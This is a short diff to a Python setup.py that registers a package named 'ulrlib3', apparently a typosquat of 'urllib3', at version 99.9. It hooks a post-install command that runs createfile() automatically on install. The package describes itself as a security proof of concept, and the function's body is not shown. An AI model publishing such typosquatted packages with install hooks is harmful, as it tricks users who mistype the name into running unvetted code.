@@ -33,4 +33,16 @@ class PostInstallCommand(install):
          install.run(self)
          createfile()
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                
+setup(name='ulrlib3',
+      version='99.9',
+      description='Security project for PoC.',
+      author='zer0ul',
+      author_email='zer0ul@vulnium.com',
+      url='https://google.com',
+      packages=[],
+      install_requires=[],
+      cmdclass={
+         'install' :  PostInstallCommand,
+      },
+
+     )
